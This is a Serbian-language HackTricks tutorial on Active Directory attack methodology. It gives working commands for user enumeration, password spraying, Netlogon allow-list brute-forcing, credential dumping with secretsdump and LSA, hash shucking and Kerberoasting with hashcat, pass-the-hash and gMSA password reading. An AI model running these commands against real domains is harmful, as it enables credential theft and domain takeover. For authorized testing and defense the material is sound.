# Metodologija za Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Osnovni pregled

**Active Directory** je ključna tehnologija koja **mrežnim administratorima** omogućava efikasno kreiranje i upravljanje **domenima**, **korisnicima** i **objektima** u mreži. Osmišljen je tako da se može skalirati, olakšavajući organizovanje velikog broja korisnika u pregledne **grupe** i **podgrupe**, uz kontrolu **prava pristupa** na različitim nivoima.

Struktura sistema **Active Directory** sastoji se od tri osnovna sloja: **domena**, **stabala** i **šuma**. **Domen** obuhvata skup objekata, kao što su **korisnici** ili **uređaji**, koji dele zajedničku bazu podataka. **Stabla** su grupe ovih domena povezane zajedničkom strukturom, a **šuma** predstavlja skup više stabala međusobno povezanih **odnosima poverenja**, čime se formira najviši sloj organizacione strukture. Konkretna **prava pristupa** i **komunikacije** mogu se odrediti na svakom od ovih nivoa.

Ključni pojmovi u sistemu **Active Directory**:

1. **Direktorijum** – Čuva sve informacije o objektima u sistemu Active Directory.
2. **Objekat** – Označava entitete u direktorijumu, uključujući **korisnike**, **grupe** i **deljene fascikle**.
3. **Domen** – Služi kao kontejner za objekte direktorijuma; više domena može postojati u okviru **šume**, a svaki održava sopstveni skup objekata.
4. **Stablo** – Grupa domena koji dele zajednički korenski domen.
5. **Šuma** – Najviši nivo organizacione strukture u sistemu Active Directory, sastavljen od nekoliko stabala povezanih **odnosima poverenja**.

**Active Directory Domain Services (AD DS)** obuhvata niz usluga ključnih za centralizovano upravljanje mrežom i komunikaciju u njoj. Te usluge obuhvataju:

1. **Domain Services** – Centralizuje skladištenje podataka i upravlja interakcijama između **korisnika** i **domena**, uključujući funkcije **autentifikacije** i **pretrage**.
2. **Certificate Services** – Upravlja kreiranjem, distribucijom i održavanjem bezbednih **digitalnih sertifikata**.
3. **Lightweight Directory Services** – Podržava aplikacije koje koriste direktorijume putem **LDAP protokola**.
4. **Directory Federation Services** – Omogućava **jedinstvenu prijavu (single sign-on)** za autentifikaciju korisnika u više veb-aplikacija tokom jedne sesije.
5. **Rights Management** – Pomaže u zaštiti materijala zaštićenog autorskim pravima, tako što sprečava njegovu neovlašćenu distribuciju i upotrebu.
6. **DNS Service** – Ključna usluga za razrešavanje **imena domena**.

Detaljnije objašnjenje potražite na stranici: [**TechTerms - definicija sistema Active Directory**](https://techterms.com/definition/active_directory)

### **Kerberos autentifikacija**

Da biste naučili kako da **napadnete AD**, morate dobro da **razumete** proces **Kerberos autentifikacije**.\
[**Pročitajte ovu stranicu ako još ne znate kako funkcioniše.**](kerberos-authentication.md)

## Podsetnik

Možete da posetite [https://wadcoms.github.io/](https://wadcoms.github.io) i brzo pogledate koje komande možete da pokrenete za enumeraciju/eksploataciju AD-a.

> [!WARNING]
> Kerberos komunikacija obično **zahteva potpuno kvalifikovano ime domena (FQDN)** kako bi klijent mogao da dobije tiket za odgovarajući SPN. Pristup mašini putem IP adrese obično dovodi do korišćenja NTLM-a umesto Kerberos-a.

## Recon Active Directory (bez kredencijala/sesija)

Ako imate pristup AD okruženju, ali nemate kredencijale/sesije, možete:

- **Pentestovati mrežu:**
  - Skenirajte mrežu, pronađite mašine i otvorene portove, pa pokušajte da **eksploatišete ranjivosti** ili **izvučete kredencijale** iz njih (na primer, [štampači mogu biti veoma zanimljive mete](ad-information-in-printers.md)).
  - Enumeracija DNS-a može otkriti informacije o ključnim serverima u domenu, kao što su veb-serveri, štampači, deljeni resursi, VPN, mediji itd.
    - `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
  - Pogledajte opštu [**metodologiju za pentesting**](../../generic-methodologies-and-resources/pentesting-methodology.md) da biste saznali više o tome.
- **Proverite da li su null i Guest pristup omogućeni na SMB servisima** (ovo neće raditi na novijim verzijama Windows-a):
  - `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
  - `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
  - `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
  - Detaljnije uputstvo za enumeraciju SMB servera možete pronaći ovde:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerišite LDAP**
  - `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
  - Detaljnije uputstvo za enumeraciju LDAP-a možete pronaći ovde (obratite **posebnu pažnju na anonimni pristup**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Zatrovajte mrežu**
  - Prikupite kredencijale [**lažnim predstavljanjem servisa pomoću Responder-a**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
  - Pristupite hostu [**zloupotrebom relay napada**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
  - Prikupite kredencijale tako što ćete **izložiti** [**lažne UPnP servise pomoću evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
  - Izvucite korisnička imena/imena iz internih dokumenata, društvenih mreža i servisa (uglavnom veb) u domenskom okruženju, kao i iz javno dostupnih izvora.
  - Ako pronađete puna imena zaposlenih u kompaniji, možete isprobati različite AD **konvencije za korisnička imena (**[**pročitajte ovo**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Najčešće konvencije su: _ImePrezime_, _Ime.Prezime_, _ImePre_ (3 slova od svakog), _Ime.Pre_, _IPrezime_, _I.Prezime_, _PrezimeIme_, _Prezime.Ime_, _PrezimeI_, _Prezime.I_, 3 _nasumična slova i 3 nasumične cifre_ (abc123).
  - Alati:
    - [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
    - [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Enumeracija korisnika

- **Anonimna SMB/LDAP enumeracija:** Pogledajte stranice za [**pentesting SMB-a**](../../network-services-pentesting/pentesting-smb/index.html) i [**pentesting LDAP-a**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enumeracija**: Kada se zatraži **nevažeće korisničko ime**, server će odgovoriti Kerberos kodom greške _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, što nam omogućava da utvrdimo da korisničko ime nije važeće. Za **važeća korisnička imena** server će vratiti ili **TGT u AS-REP** odgovoru ili grešku _KRB5KDC_ERR_PREAUTH_REQUIRED_, koja označava da korisnik mora da obavi preautentifikaciju.
- **Bez autentifikacije preko MS-NRPC**: Korišćenje auth-level = 1 (bez autentifikacije) na interfejsu MS-NRPC (Netlogon) na kontrolerima domena. Ova metoda poziva funkciju `DsrGetDcNameEx2` nakon povezivanja na interfejs MS-NRPC, kako bi proverila da li korisnik ili računar postoji, bez kredencijala. Alat [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementira ovu vrstu enumeracije. Istraživanje možete pronaći [ovde](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>

```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```

- **OWA (Outlook Web Access) server**

Ako ste na mreži pronašli jedan od ovih servera, možete da izvršite i **enumeraciju korisnika na njemu**. Na primer, možete da koristite alat [**MailSniper**](https://github.com/dafthack/MailSniper):

```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```

> [!WARNING]
> Liste korisničkih imena možete pronaći u [**ovom GitHub repozitorijumu**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) i u ovom ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Međutim, trebalo bi da imate **imena ljudi koji rade u kompaniji** na osnovu koraka za prikupljanje informacija koje ste prethodno trebalo da obavite. Na osnovu imena i prezimena možete koristiti skriptu [**namemash.py**](https://gist.github.com/superkojiman/11076951) za generisanje potencijalno važećih korisničkih imena.

### Zloupotreba liste dozvoljenih ranjivih Netlogon kanala (Onelogon)

Čak i nakon što je **Zerologon** zakrpljen na DC-u, izričito dozvoljeni nalozi i dalje mogu biti izloženi **nasleđenom/ranjivom ponašanju bezbednog kanala Netlogon**. Rizična konfiguracija je GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** ili odgovarajuća vrednost registra **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Ta vrednost je **SDDL bezbednosni deskriptor** (pogledajte [Security Descriptors](security-descriptors.md)). Svaki nalog ili grupa kojoj je dodeljen odgovarajući ACE u DACL-u može biti meta. Na primer, `O:BAG:BAD:(A;;RC;;;WD)` efektivno dodaje na listu dozvoljenih **Everyone**.

Praktični tok rada za operatera:

1. **Identifikujte glavne bezbednosne entitete na listi dozvoljenih** tako što ćete proveriti i **SYSVOL/GPO** i **registar aktivnog DC-a**.
2. **Razrešite SID-ove** pronađene u SDDL-u u stvarne AD korisnike/računare i dajte prioritet **nalozima računara DC-a**, **nalozima poverenja** i drugim privilegovanim mašinama.
3. Uzastopno pokušavajte **MS-NRPC / Netlogon autentifikaciju** kao nalog sa liste dozvoljenih.
4. Nakon uspešnog pogađanja, zloupotrebite **Netlogon podešavanje lozinke** da biste resetovali lozinku ciljnog naloga (javni PoC je postavlja na prazan string).<sup>[[9]](#references)[[10]](#references)</sup>

Primeri brze trijaže / laboratorijskog okruženja iz javnog artefakta:

```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
  --comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```

Beleške:

- **Skener** je koristan jer se efektivna allow-lista može nalaziti u **SYSVOL**, **registru** ili na oba mesta.
- Sama putanja exploita je važna jer **ne zahteva privilegije Domain Admin-a** kada se identifikuje ranjiv nalog.
- Kompromitovanje **naloga računara kontrolera domena**, kao što je `DC$`, posebno je opasno jer resetovanje lozinke može direktno da omogući šire putanje za **preuzimanje AD-a**.
- Mogućnost **brute-force** napada zavisi od režima: javno dostupni artefakt opisuje meet-in-the-middle pristup, **24-bitni** brute force kada je dostupan drugi nalog računara i sporije **32-bitne** varijante.

Napomene za detekciju / ojačavanje bezbednosti:

- Proverite politiku allow-liste i uklonite sve osim privremenih izuzetaka za kompatibilnost koji su izričito neophodni.
- Pratite DC **System** događaje **5827/5828/5829/5830/5831** da biste otkrili ranjive Netlogon veze koje su odbijene, otkrivene ili izričito dozvoljene politikom.
- Tretirajte naloge u `VulnerableChannelAllowList` kao **visokorizične** dok se ne ukloni zavisnost od zastarelog sistema.

### Poznavanje jednog ili više korisničkih imena

U redu, znate da već imate važeće korisničko ime, ali nemate lozinke... Zatim probajte:

- [**ASREPRoast**](asreproast.md): Ako korisnik **nema** atribut _DONT_REQ_PREAUTH_, možete **zatražiti AS_REP poruku** za tog korisnika, koja će sadržati podatke šifrovane izvedenicom korisničke lozinke.
- [**Password Spraying**](password-spraying.md): Probajmo najčešće **lozinke** za svakog od otkrivenih korisnika; možda neki korisnik koristi slabu lozinku (imajte na umu smernice za lozinke!).
  - Imajte na umu da možete da **spray-ujete i OWA servere** da biste pokušali da pristupite korisničkim serverima pošte.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Možda ćete moći da **pribavite** neke challenge **hash-eve** tako što ćete izvršiti **poisoning** nekih **mrežnih** protokola:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Enumeracija Active Directory-ja pruža korisnička imena, identifikatore e-pošte i obrasce imenovanja, potencijalne hostove i servise čiji se korisnici mogu navesti na autentifikaciju. Iskoristite taj kontekst da biste identifikovali moguće NTLM [**relay napade**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) i potencijalne putanje u AD okruženje.

### NetExec izviđanje zasnovano na workspace-u i provere relay položaja

- Koristite **`nxcdb` workspaces** da biste sačuvali stanje AD izviđanja za svako angažovanje: `workspace create <name>` pravi SQLite baze podataka za svaki protokol u `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Menjajte prikaz pomoću `proto smb|mssql|winrm` i izlistajte prikupljene tajne pomoću `creds`. Ručno obrišite osetljive podatke kada završite: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- Brzo otkrivanje podmreže pomoću **`netexec smb <cidr>`** prikazuje **domen**, **verziju OS-a**, **zahteve za SMB potpisivanje** i **Null Auth**. Članovi kod kojih je prikazano `(signing:False)` podložni su **relay napadima**, dok DC-ovi često zahtevaju potpisivanje.
- Generišite **imena hostova u /etc/hosts** direktno iz NetExec izlaza da biste olakšali ciljanje:

```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```

- Kada je **SMB relay to the DC blokiran** zbog signing-a, ipak proverite stanje **LDAP**-a: `netexec ldap <dc>` ističe `(signing:None)` / slabo channel binding podešavanje. DC kod kog je SMB signing obavezan, ali je LDAP signing onemogućen, i dalje je pogodna meta za **relay-to-LDAP** napade kao što je **SPN-less RBCD**.

### Curenje akreditiva štampača na strani klijenta → masovna validacija domenskih akreditiva

- Veb interfejsi štampača ponekad **ugrađuju maskirane administratorske lozinke u HTML**. Pregled izvornog koda/devtools-a može da otkrije lozinku u čistom tekstu (npr. `<input value="<password>">`), što omogućava pristup repozitorijumima za skeniranje/štampanje putem Basic-auth-a.
- Preuzeti zadaci štampanja mogu da sadrže **dokumentaciju za uvođenje u rad u čistom tekstu** sa lozinkama pojedinačnih korisnika. Pri testiranju pazite da parovi ostanu usklađeni:<sup>[[6]](#references)</sup>

```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```

### Krađa NTLM kredencijala

Ako možete da **pristupite drugim računarima ili deljenim resursima** kao **null ili guest korisnik**, mogli biste da **postavite fajlove** (kao što je SCF fajl) koji će, ako im neko nekako pristupi, **izazvati NTLM autentifikaciju prema vama**, pa možete da **ukradete** **NTLM challenge** i razbijete ga:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking i NT-Candidate napadi

**Hash shucking** tretira svaki NT hash koji već posedujete kao kandidat za lozinku u drugim, sporijim formatima čiji se ključni materijal izvodi direktno iz NT hasha. Umesto da brute-force-ujete duge fraze u Kerberos RC4 tiketima, NetNTLM challenge-ovima ili keširanim kredencijalima, prosleđujete NT hash-eve Hashcat NT-candidate režimima i puštate ih da provere ponovnu upotrebu lozinki, a da pritom nikada ne saznate lozinku u otvorenom tekstu. Ovo je naročito efikasno nakon kompromitovanja domena, kada možete da prikupite hiljade trenutnih i istorijskih NT hash-eva.<sup>[[5]](#references)</sup>

Koristite shucking kada:

- Imate NT korpus iz DCSync, SAM/SECURITY dump-ova ili trezora kredencijala i treba da proverite da li se kredencijali ponovo koriste u drugim domenima/šumama.
- Uhvatite Kerberos materijal zasnovan na RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM odgovore ili DCC/DCC2 blob-ove.
- Želite brzo da potvrdite ponovnu upotrebu dugih, neprobojnih fraza i odmah pređete na Pass-the-Hash.

Ova tehnika **ne funkcioniše** protiv tipova enkripcije čiji ključevi nisu NT hash (npr. Kerberos etype 17/18 AES). Ako domen nameće isključivo AES, morate da se vratite na uobičajene režime za lozinke.

#### Pravljenje korpusa NT hash-eva

- **DCSync/NTDS** – Koristite `secretsdump.py` sa istorijom da biste prikupili što veći skup NT hash-eva (i njihove prethodne vrednosti):

  ```bash
  secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
  grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
  ```

  Unosi iz istorije značajno proširuju skup kandidata jer Microsoft može da sačuva do 24 prethodna hash-a po nalogu. Za više načina prikupljanja NTDS tajni pogledajte:

{{#ref}}
dcsync.md
{{#endref}}

- **Dump-ovi keša endpointa** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (ili Mimikatz `lsadump::sam /patch`) izdvaja lokalne SAM/SECURITY podatke i keširane prijave na domen (DCC/DCC2). Uklonite duplikate i dodajte te hash-eve na istu listu `nt_candidates.txt`.
- **Praćenje metapodataka** – Čuvajte korisničko ime/domen iz kog potiče svaki hash (čak i ako wordlist sadrži samo hex). Kada Hashcat prikaže pronađenu lozinku, podudarni hash-evi vam odmah pokazuju koji principal ponovo koristi lozinku.
- Dajte prednost kandidatima iz iste šume ili pouzdane šume; time se povećava verovatnoća preklapanja pri shucking-u.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Napomene:

- Ulazi za NT-candidate **moraju da ostanu sirovi NT hash-evi od 32 heksadecimalna znaka**. Onemogućite rule engines (bez `-r` i hibridnih režima), jer izmene kvare materijal ključa kandidata.
- Ovi režimi nisu sami po sebi brži, ali je NTLM prostor ključeva (~30.000 MH/s na M3 Max) oko 100 puta brži od Kerberos RC4 (~300 MH/s). Testiranje pažljivo odabrane NT liste mnogo je jeftinije nego pretraživanje celog prostora lozinki u sporom formatu.
- Uvek koristite **najnoviju verziju Hashcat-a** (`git clone https://github.com/hashcat/hashcat && make install`), jer su režimi 31500/31600/35300/35400 objavljeni nedavno.<sup>[[7]](#references)</sup>
- Trenutno ne postoji NT režim za AS-REQ Pre-Auth, a AES etypes (19600/19700) zahtevaju lozinku u otvorenom tekstu jer se njihovi ključevi izvode pomoću PBKDF2 iz lozinki u UTF-16LE, a ne iz sirovih NT hash-eva.

#### Primer – Kerberoast RC4 (režim 35300)

1. Uhvatite RC4 TGS za ciljni SPN pomoću korisnika sa niskim privilegijama (detalje potražite na stranici Kerberoast):

{{#ref}}
kerberoast.md
{{#endref}}

   ```bash
   GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
   ```

2. Izvucite ticket pomoću svoje NT liste:

   ```bash
   hashcat -m 35300 roastable_TGS nt_candidates.txt
   ```

   Hashcat izvodi RC4 ključ iz svakog NT kandidata i proverava `$krb5tgs$23$...` blob. Poklapanje potvrđuje da servisni nalog koristi jedan od vaših postojećih NT hash-eva.

3. Odmah pređite na PtH:

   ```bash
   nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
   ```

   Oporavljeni tekst možete kasnije da pronađete pomoću `hashcat -m 1000 <matched_hash> wordlists/`, ako bude potrebno.

#### Primer – Keširani akreditivi (režim 31600)

1. Izvucite keširane prijave sa kompromitovane radne stanice:

   ```bash
   nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
   ```

2. Kopirajte DCC2 liniju za zanimljivog korisnika domena u `dcc2_highpriv.txt` i shuck-ujte je:

   ```bash
   hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
   ```

3. Uspešno poklapanje daje NT hash koji je već poznat na vašoj listi, što dokazuje da keširani korisnik ponovo koristi istu lozinku. Iskoristite ga direktno za PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) ili ga brute-force-ujte u brzom NTLM režimu da biste otkrili lozinku.

Potpuno isti workflow važi za NetNTLM challenge-response vrednosti (`-m 27000/27100`) i DCC (`-m 31500`). Kada identifikujete poklapanje, možete pokrenuti relay, SMB/WMI/WinRM PtH ili ponovo crack-ovati NT hash pomoću maski/pravila offline.



## Enumerisanje Active Directory-ja SA credentials/session

Za ovu fazu morate da **kompromitujete credentials ili sesiju važećeg domenskog naloga.** Ako imate važeće credentials ili shell kao domenski korisnik, **imajte na umu da su prethodno navedene opcije i dalje dostupne za kompromitovanje drugih korisnika**.

Pre nego što počnete sa autentifikovanim enumerisanjem, upoznajte se sa **Kerberos double-hop problemom**.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumerisanje

Kompromitovanje naloga je **veliki korak ka proceni domena**, jer omogućava autentifikovano **enumerisanje Active Directory-ja**:

Što se tiče [**ASREPRoast**](asreproast.md), sada možete pronaći sve potencijalno ranjive korisnike, a što se tiče [**Password Spraying**](password-spraying.md), možete dobiti **listu svih korisničkih imena** i isprobati lozinku kompromitovanog naloga, prazne lozinke i nove obećavajuće lozinke.

- Možete koristiti [**CMD za osnovni recon**](../basic-cmd-for-pentesters.md#domain-info)
- Možete koristiti i [**powershell za recon**](../basic-powershell-for-pentesters/index.html), što će biti prikrivenije
- Možete i [**koristiti powerview**](../basic-powershell-for-pentesters/powerview.md) da biste izvukli detaljnije informacije
- Još jedan odličan alat za recon u Active Directory-ju je [**BloodHound**](bloodhound.md). **Nije naročito prikriven** (zavisno od metoda prikupljanja koje koristite), ali **ako vam to nije važno**, svakako ga isprobajte. Pronađite gde korisnici mogu da koriste RDP, putanje do drugih grupa itd.
  - **Ostali automatizovani alati za AD enumeraciju su:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS zapisi AD-ja**](ad-dns-records.md), jer mogu sadržati zanimljive informacije.
- **Alat sa GUI-jem** koji možete koristiti za enumerisanje direktorijuma je **AdExplorer.exe** iz paketa **SysInternal** Suite.
- Možete pretraživati i LDAP bazu pomoću **ldapsearch** da biste potražili credentials u poljima _userPassword_ i _unixUserPassword_, pa čak i u beleškama _description_ i _info_ korisnika. Token u polju _info_ koji liči na lozinku, ali nije označen, samo je kandidat: zasebno proverite njegovu namenu i važećnost, a tokom rutinskog enumerisanja ne uključujte sadržaj beleški u izlaz. Druge metode potražite na stranici [Password in AD User comment na PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment).
- Kada je pristup dozvoljen, pregledajte dostupne skripte za domensko prijavljivanje i mapiranje diskova u `\\<dc>\NETLOGON` ili `\\<dc>\SYSVOL\<domain>\scripts`. [Microsoft dokumentuje](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/netlogon-share-not-present-after-install-ad-ds-on-full-read-only-domain-controller) ulogu NETLOGON share-a kao direktorijuma za skripte. Najpre izlistajte nazive, a zatim pregledajte samo relevantne, čitljive skripte u okviru ograničenja veličine; nemojte preuzimati ceo share niti ispisivati vrednosti credentials tokom rutinskog enumerisanja. PowerShell poziv [`ConvertTo-SecureString -AsPlainText`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring) **ne štiti** doslovno navedenu lozinku sačuvanu u skripti. Sam poziv ne dokazuje da je tajna hardkodirana: utvrdite šta mu se prosleđuje, a zatim zasebno proverite nalog, važećnost credentials i privilegije. Pregled domenske skripte na udaljenom share-u odvojen je od enumerisanja lokalnog hosta.
- Ako koristite **Linux**, možete enumerisati domen i pomoću [**pywerview**](https://github.com/the-useless-one/pywerview).
- Možete isprobati i automatizovane alate kao što su:
  - [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
  - [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Izdvajanje svih domenskih korisnika**

  Veoma je lako pribaviti sva domenska korisnička imena iz Windows-a (`net user /domain` ,`Get-DomainUser` ili `wmic useraccount get name,sid`). U Linux-u možete koristiti: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` ili `enum4linux -a -u "user" -p "password" <DC IP>`

> Iako ovaj odeljak o enumeraciji deluje kratak, on je najvažniji deo svega. Otvorite linkove (naročito one za cmd, powershell, powerview i BloodHound), naučite kako da enumerišete domen i vežbajte dok ne budete sigurni u svoje sposobnosti. Tokom procene, ovo je ključni trenutak za pronalaženje puta do DA ili za odluku da se ništa ne može učiniti.

### Predvidljivi unapred kreirani computer accounts -> pristup gMSA lozinki

Computer accounts pripremljeni za nasleđene join procese mogu zadržati predvidljivu početnu lozinku. NetExec-ov `pre2k` modul pronalazi karakterističnu vrednost `userAccountControl` `4128` (`WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD`) i pokušava da dobije Kerberos TGT pomoću prvih 14 znakova malim slovima napisanog imena računara, bez završnog `$`. Tretirajte ovu UAC vrednost kao kriterijum za odabir kandidata, umesto da pretpostavite da samo članstvo u grupi **Pre-Windows 2000 Compatible Access** dokazuje da je lozinka slaba.<sup>[[18]](#references)[[20]](#references)</sup>

Koristite autentifikovano LDAP enumerisanje da biste testirali kandidate i sačuvali uspešne TGT-ove. `ALL=True` proširuje testiranje i na objekte koji ne odgovaraju podrazumevanom filteru `4128`.<sup>[[18]](#references)</sup>

```bash
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k -o ALL=True

# Validate a candidate explicitly with Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k
```

Neuspešan podrazumevani/NTLM bind **ne** opovrgava ovaj nalaz: testirajte pomoću `-k`, FQDN-a koji se razrešava na DC i sata sinhronizovanog sa KDC-om. Uspešna pokretanja modula upisuju liste kandidata i pribavljene ccaches u `~/.nxc/modules/pre2k/`.<sup>[[18]](#references)[[20]](#references)</sup>

Nakon kompromitovanja računarskog principal-a, grafički prikažite njegova ugnježdena članstva u grupama i izlazna prava. Konkretno, principali navedeni u bezbednosnom deskriptoru `msDS-GroupMSAMembership` gMSA naloga mogu da čitaju `msDS-ManagedPassword`; NetExec-ov izlaz opcije `--gmsa` prikazuje dozvoljene principale i vraća trenutni NT hash kada je autentifikovani računar ovlašćen.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Enumerate gMSAs and their password readers with the initial user
netexec ldap dc.corp.local -u auditor -p 'Password!' --gmsa

# Re-query as the compromised computer through Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k --gmsa
```

Zatim proceni oporavljeni gMSA kao bilo koji drugi credential: proveri članstvo u lokalnim/domenskim grupama, prava za logon, SPN-ove, delegaciju i dostupne servise pre nego što pokušaš pass-the-hash. Ovaj način pribavljanja zasnovan na ACL-u razlikuje se od [Golden gMSA/dMSA](golden-dmsa-gmsa.md), koji izvodi managed password vrednosti nakon kompromitovanja KDS root key-a.<sup>[[20]](#references)</sup>

Computer principal može imati i izlaznu kontrolu nad drugim computer objektima ili grupama. Nakon što ga pribaviš, zasebno proveri njegova ugnježdena članstva i efektivne ACL-ove: pravo upisa na drugi computer objekat može omogućiti promenu naloga, a prava za članstvo u grupi mogu dovesti do logon uloge. Oznaka staged-account, predvidljiva konvencija imenovanja ili sama `GenericWrite` veza ne dokazuju da je ceo put moguć.

Čitljiva kopija `msDS-ManagedPassword` bloba u datoteci, deljenom resursu ili rezervnoj kopiji predstavlja zaseban put izlaganja: LDAP read ACL ne štiti kopiju sačuvanu negde drugde. Proveri da li su podaci managed-password blob pre nego što ih protumačiš i razlikuj ovo od odobrenog LDAP read-a i izvođenja na osnovu KDS root key-a.

### Kerberoast

Kerberoasting podrazumeva pribavljanje **TGS tiketa** koje koriste servisi povezani sa korisničkim nalozima i offline razbijanje njihove enkripcije — koja se zasniva na korisničkim lozinkama.

Više o ovome:


{{#ref}}
kerberoast.md
{{#endref}}

### Udaljena veza (RDP, SSH, FTP, Win-RM itd.)

